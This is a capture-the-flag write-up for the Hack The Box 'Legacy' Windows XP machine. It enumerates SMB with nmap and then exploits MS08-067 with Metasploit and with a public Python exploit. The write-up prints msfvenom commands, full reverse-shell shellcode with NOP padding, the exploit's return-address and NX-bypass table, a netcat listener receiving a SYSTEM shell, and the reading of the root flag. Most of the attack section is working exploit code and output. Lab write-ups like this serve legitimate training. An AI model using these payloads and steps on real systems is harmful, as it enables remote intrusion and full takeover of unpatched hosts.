# Legacy

IP_10.10.10.4

## NMAP
```
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

## SMB
```
Host script results:
|_clock-skew: mean: 5d00h28m20s, deviation: 2h07m16s, median: 4d22h58m20s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:68:61 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-05-01T20:02:17+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```
From: https://www.varonis.com/blog/smb-port/


    Port 139: SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network.

    Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.

## Metasploit:
The first result in google can say us: 
https://duckduckgo.com/?q=smb+win+xp+xploit&t=ffab&ia=web
```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set TARGET 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.4:1032) at 2020-04-26 17:49:51 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
## W/O Metasploit

Let's execute more nmap then:
```
kali@kali:~/CTFs/Writeups/eternals/HTB/Legacy$ nmap -p 139,445 --script "smb-vuln-*" 10.10.10.4 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 17:55 CEST
Nmap scan report for 10.10.10.4
Host is up (0.048s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 23.36 seconds
```

We have not lucky with the first script result, so let's go with the second one, "smb-vuln-ms08-067":

```
kali@kali:~$ searchsploit ms08 067
--------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                   |  Path
                                                                                 | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------- ----------------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)            | exploits/windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                             | exploits/windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                       | exploits/windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Me | exploits/windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                   | exploits/windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                   | exploits/windows/remote/7132.py
--------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Got the first one, (an changed name to ms08-067.py for being more handy). Inside this file, we got the shellcode with a comment:
```
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x2b\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xb7\xdd\x9e\xe0\x83\xee\xfc\xe2\xf4\x4b\x35"
shellcode += "\x1c\xe0\xb7\xdd\xfe\x69\x52\xec\x5e\x84\x3c\x8d\xae"
shellcode += "\x6b\xe5\xd1\x15\xb2\xa3\x56\xec\xc8\xb8\x6a\xd4\xc6"
shellcode += "\x86\x22\x32\xdc\xd6\xa1\x9c\xcc\x97\x1c\x51\xed\xb6"
shellcode += "\x1a\x7c\x12\xe5\x8a\x15\xb2\xa7\x56\xd4\xdc\x3c\x91"
shellcode += "\x8f\x98\x54\x95\x9f\x31\xe6\x56\xc7\xc0\xb6\x0e\x15"
shellcode += "\xa9\xaf\x3e\xa4\xa9\x3c\xe9\x15\xe1\x61\xec\x61\x4c"
shellcode += "\x76\x12\x93\xe1\x70\xe5\x7e\x95\x41\xde\xe3\x18\x8c"
shellcode += "\xa0\xba\x95\x53\x85\x15\xb8\x93\xdc\x4d\x86\x3c\xd1"
shellcode += "\xd5\x6b\xef\xc1\x9f\x33\x3c\xd9\x15\xe1\x67\x54\xda"
shellcode += "\xc4\x93\x86\xc5\x81\xee\x87\xcf\x1f\x57\x82\xc1\xba"
shellcode += "\x3c\xcf\x75\x6d\xea\xb5\xad\xd2\xb7\xdd\xf6\x97\xc4"
shellcode += "\xef\xc1\xb4\xdf\x91\xe9\xc6\xb0\x22\x4b\x58\x27\xdc"
shellcode += "\x9e\xe0\x9e\x19\xca\xb0\xdf\xf4\x1e\x8b\xb7\x22\x4b"
shellcode += "\x8a\xb2\xb5\x5e\x48\xa9\x90\xf6\xe2\xb7\xdc\x25\x69"
shellcode += "\x51\x8d\xce\xb0\xe7\x9d\xce\xa0\xe7\xb5\x74\xef\x68"
shellcode += "\x3d\x61\x35\x20\xb7\x8e\xb6\xe0\xb5\x07\x45\xc3\xbc"
shellcode += "\x61\x35\x32\x1d\xea\xea\x48\x93\x96\x95\x5b\x35\xff"
shellcode += "\xe0\xb7\xdd\xf4\xe0\xdd\xd9\xc8\xb7\xdf\xdf\x47\x28"
shellcode += "\xe8\x22\x4b\x63\x4f\xdd\xe0\xd6\x3c\xeb\xf4\xa0\xdf"
shellcode += "\xdd\x8e\xe0\xb7\x8b\xf4\xe0\xdf\x85\x3a\xb3\x52\x22"
shellcode += "\x4b\x73\xe4\xb7\x9e\xb6\xe4\x8a\xf6\xe2\x6e\x15\xc1"
shellcode += "\x1f\x62\x5e\x66\xe0\xca\xff\xc6\x88\xb7\x9d\x9e\xe0"
shellcode += "\xdd\xdd\xce\x88\xbc\xf2\x91\xd0\x48\x08\xc9\x88\xc2"
shellcode += "\xb3\xd3\x81\x48\x08\xc0\xbe\x48\xd1\xba\x09\xc6\x22"
shellcode += "\x61\x1f\xb6\x1e\xb7\x26\xc2\x1a\x5d\x5b\x57\xc0\xb4"
shellcode += "\xea\xdf\x7b\x0b\x5d\x2a\x22\x4b\xdc\xb1\xa1\x94\x60"
shellcode += "\x4c\x3d\xeb\xe5\x0c\x9a\x8d\x92\xd8\xb7\x9e\xb3\x48"
shellcode += "\x08\x9e\xe0"
```

So we need to create our own shellcode for our IP and Port:

```
(venv2) kali@kali:~/CTFs/Writeups/eternals/HTB/Legacy/exploits$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=1999 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode
/usr/share/rubygems-integration/all/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1953 bytes
shellcode =  b""
shellcode += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x66\xb5\xf8\xe2\x83\xee\xfc"
shellcode += b"\xe2\xf4\x9a\x5d\x7a\xe2\x66\xb5\x98\x6b\x83"
shellcode += b"\x84\x38\x86\xed\xe5\xc8\x69\x34\xb9\x73\xb0"
shellcode += b"\x72\x3e\x8a\xca\x69\x02\xb2\xc4\x57\x4a\x54"
shellcode += b"\xde\x07\xc9\xfa\xce\x46\x74\x37\xef\x67\x72"
shellcode += b"\x1a\x10\x34\xe2\x73\xb0\x76\x3e\xb2\xde\xed"
shellcode += b"\xf9\xe9\x9a\x85\xfd\xf9\x33\x37\x3e\xa1\xc2"
shellcode += b"\x67\x66\x73\xab\x7e\x56\xc2\xab\xed\x81\x73"
shellcode += b"\xe3\xb0\x84\x07\x4e\xa7\x7a\xf5\xe3\xa1\x8d"
shellcode += b"\x18\x97\x90\xb6\x85\x1a\x5d\xc8\xdc\x97\x82"
shellcode += b"\xed\x73\xba\x42\xb4\x2b\x84\xed\xb9\xb3\x69"
shellcode += b"\x3e\xa9\xf9\x31\xed\xb1\x73\xe3\xb6\x3c\xbc"
shellcode += b"\xc6\x42\xee\xa3\x83\x3f\xef\xa9\x1d\x86\xea"
shellcode += b"\xa7\xb8\xed\xa7\x13\x6f\x3b\xdd\xcb\xd0\x66"
shellcode += b"\xb5\x90\x95\x15\x87\xa7\xb6\x0e\xf9\x8f\xc4"
shellcode += b"\x61\x4a\x2d\x5a\xf6\xb4\xf8\xe2\x4f\x71\xac"
shellcode += b"\xb2\x0e\x9c\x78\x89\x66\x4a\x2d\xb2\x36\xe5"
shellcode += b"\xa8\xa2\x36\xf5\xa8\x8a\x8c\xba\x27\x02\x99"
shellcode += b"\x60\x6f\x88\x63\xdd\xf2\xe8\x68\xa4\x90\xe0"
shellcode += b"\x66\xb2\x37\x6b\x80\xdf\xe8\xb4\x31\xdd\x61"
shellcode += b"\x47\x12\xd4\x07\x37\xe3\x75\x8c\xee\x99\xfb"
shellcode += b"\xf0\x97\x8a\xdd\x08\x57\xc4\xe3\x07\x37\x0e"
shellcode += b"\xd6\x95\x86\x66\x3c\x1b\xb5\x31\xe2\xc9\x14"
shellcode += b"\x0c\xa7\xa1\xb4\x84\x48\x9e\x25\x22\x91\xc4"
shellcode += b"\xe3\x67\x38\xbc\xc6\x76\x73\xf8\xa6\x32\xe5"
shellcode += b"\xae\xb4\x30\xf3\xae\xac\x30\xe3\xab\xb4\x0e"
shellcode += b"\xcc\x34\xdd\xe0\x4a\x2d\x6b\x86\xfb\xae\xa4"
shellcode += b"\x99\x85\x90\xea\xe1\xa8\x98\x1d\xb3\x0e\x18"
shellcode += b"\xff\x4c\xbf\x90\x44\xf3\x08\x65\x1d\xb3\x89"
shellcode += b"\xfe\x9e\x6c\x35\x03\x02\x13\xb0\x43\xa5\x75"
shellcode += b"\xc7\x97\x88\x66\xe6\x07\x37"
```

Let's now to paste it inside the xploit and run it:
```
(venv2) kali@kali:~/CTFs/Writeups/eternals/HTB/Legacy/exploits$ python ms08-067.py 10.10.10.4 1
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#######################################################################

Windows XP SP0/SP1 Universal

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

Let's affine the SO, just' in case:
```
kali@kali:~$ sudo nmap -sV -Pn -p139-445 -O 10.10.10.4
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 13:13 CEST
Nmap scan report for 10.10.10.4
Host is up (0.053s latency).
Not shown: 305 filtered ports
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2003|2008|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows XP SP3 (92%), Microsoft Windows Server 2003 SP1 or SP2 (90%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows XP (89%), Microsoft Windows 2000 SP4 (89%), Microsoft Windows 2003 SP2 (88%), Microsoft Windows Server 2003 SP2 (87%), Microsoft Windows Server 2003 (87%), Microsoft Windows XP SP2 (87%), Microsoft Windows XP SP2 or SP3 (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.33 seconds
```

The first option is "Microsoft Windows XP SP3 (92%)". 

Inside the code, we have all options:
```
    def __DCEPacket(self):
        if (self.os=='1'):
                print 'Windows XP SP0/SP1 Universal\n'
                ret = "\x61\x13\x00\x01"
                jumper = nonxjmper % (ret, ret)
        elif (self.os=='2'):
                print 'Windows 2000 Universal\n'
                ret = "\xb0\x1c\x1f\x00"
                jumper = nonxjmper % (ret, ret)
        elif (self.os=='3'):
                print 'Windows 2003 SP0 Universal\n'
                ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
                jumper = nonxjmper % (ret, ret)
        elif (self.os=='4'):
                print 'Windows 2003 SP1 English\n'
                ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
                ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
                jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
                disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
                jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
        elif (self.os=='5'):
                print 'Windows XP SP3 French (NX)\n'
                ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
                disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
                jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='6'):
                print 'Windows XP SP3 English (NX)\n'
                ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
                disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
                jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='7'):
                print 'Windows XP SP3 English (AlwaysOn NX)\n'

```

So, our option should be the 6th or the 7th, but it doesn't work neither.
Now I can see a comment above the shell code, which says:
```
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
```

Maybe our shellcode is too short.
Ok, we need to insert more nop codes. That's because the complete shellcode might have 410 bytes, so we have to add 62 nop bytes to our code, as we can see below:
```
# 62 NOPs bytes
shellcode =  b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90"
# And now the shellcode
shellcode += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x66\xb5\xf8\xe2\x83\xee\xfc"
shellcode += b"\xe2\xf4\x9a\x5d\x7a\xe2\x66\xb5\x98\x6b\x83"
shellcode += b"\x84\x38\x86\xed\xe5\xc8\x69\x34\xb9\x73\xb0"
shellcode += b"\x72\x3e\x8a\xca\x69\x02\xb2\xc4\x57\x4a\x54"
shellcode += b"\xde\x07\xc9\xfa\xce\x46\x74\x37\xef\x67\x72"
shellcode += b"\x1a\x10\x34\xe2\x73\xb0\x76\x3e\xb2\xde\xed"
shellcode += b"\xf9\xe9\x9a\x85\xfd\xf9\x33\x37\x3e\xa1\xc2"
shellcode += b"\x67\x66\x73\xab\x7e\x56\xc2\xab\xed\x81\x73"
shellcode += b"\xe3\xb0\x84\x07\x4e\xa7\x7a\xf5\xe3\xa1\x8d"
shellcode += b"\x18\x97\x90\xb6\x85\x1a\x5d\xc8\xdc\x97\x82"
shellcode += b"\xed\x73\xba\x42\xb4\x2b\x84\xed\xb9\xb3\x69"
shellcode += b"\x3e\xa9\xf9\x31\xed\xb1\x73\xe3\xb6\x3c\xbc"
shellcode += b"\xc6\x42\xee\xa3\x83\x3f\xef\xa9\x1d\x86\xea"
shellcode += b"\xa7\xb8\xed\xa7\x13\x6f\x3b\xdd\xcb\xd0\x66"
shellcode += b"\xb5\x90\x95\x15\x87\xa7\xb6\x0e\xf9\x8f\xc4"
shellcode += b"\x61\x4a\x2d\x5a\xf6\xb4\xf8\xe2\x4f\x71\xac"
shellcode += b"\xb2\x0e\x9c\x78\x89\x66\x4a\x2d\xb2\x36\xe5"
shellcode += b"\xa8\xa2\x36\xf5\xa8\x8a\x8c\xba\x27\x02\x99"
shellcode += b"\x60\x6f\x88\x63\xdd\xf2\xe8\x68\xa4\x90\xe0"
shellcode += b"\x66\xb2\x37\x6b\x80\xdf\xe8\xb4\x31\xdd\x61"
shellcode += b"\x47\x12\xd4\x07\x37\xe3\x75\x8c\xee\x99\xfb"
shellcode += b"\xf0\x97\x8a\xdd\x08\x57\xc4\xe3\x07\x37\x0e"
shellcode += b"\xd6\x95\x86\x66\x3c\x1b\xb5\x31\xe2\xc9\x14"
shellcode += b"\x0c\xa7\xa1\xb4\x84\x48\x9e\x25\x22\x91\xc4"
shellcode += b"\xe3\x67\x38\xbc\xc6\x76\x73\xf8\xa6\x32\xe5"
shellcode += b"\xae\xb4\x30\xf3\xae\xac\x30\xe3\xab\xb4\x0e"
shellcode += b"\xcc\x34\xdd\xe0\x4a\x2d\x6b\x86\xfb\xae\xa4"
shellcode += b"\x99\x85\x90\xea\xe1\xa8\x98\x1d\xb3\x0e\x18"
shellcode += b"\xff\x4c\xbf\x90\x44\xf3\x08\x65\x1d\xb3\x89"
shellcode += b"\xfe\x9e\x6c\x35\x03\x02\x13\xb0\x43\xa5\x75"
shellcode += b"\xc7\x97\x88\x66\xe6\x07\x37"
```

Now, we can run our exploit:
```

(venv2) kali@kali:~/CTFs/Writeups/eternals/HTB/Legacy/exploits$ python ms08-067.py 10.10.10.4 6
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

And....
```
kali@kali:~/CTFs/Writeups/eternals/HTB/Legacy$ sudo nc -nlvp 1999
[sudo] password for kali: 
listening on [any] 1999 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.4] 1037
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>cd "C:\Documents and Settings\Administrator\Desktop"
cd "C:\Documents and Settings\Administrator\Desktop"
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442dxxxxxxxxxxx9e695d5713
```

Got it! :)


Note: If the exploit fails (destination unreachable, timed out or something like that), You should see if the machine is failing by something.For this, run:
```
(venv2) kali@kali:~/CTFs/Writeups/eternals/HTB/Legacy/exploits$ telnet 10.10.10.4 445
Trying 10.10.10.4...
Connected to 10.10.10.4.
Escape character is '^]'.
^]
telnet> 
```
If telnet doesn't work, any weird thing is happening, so reset the box.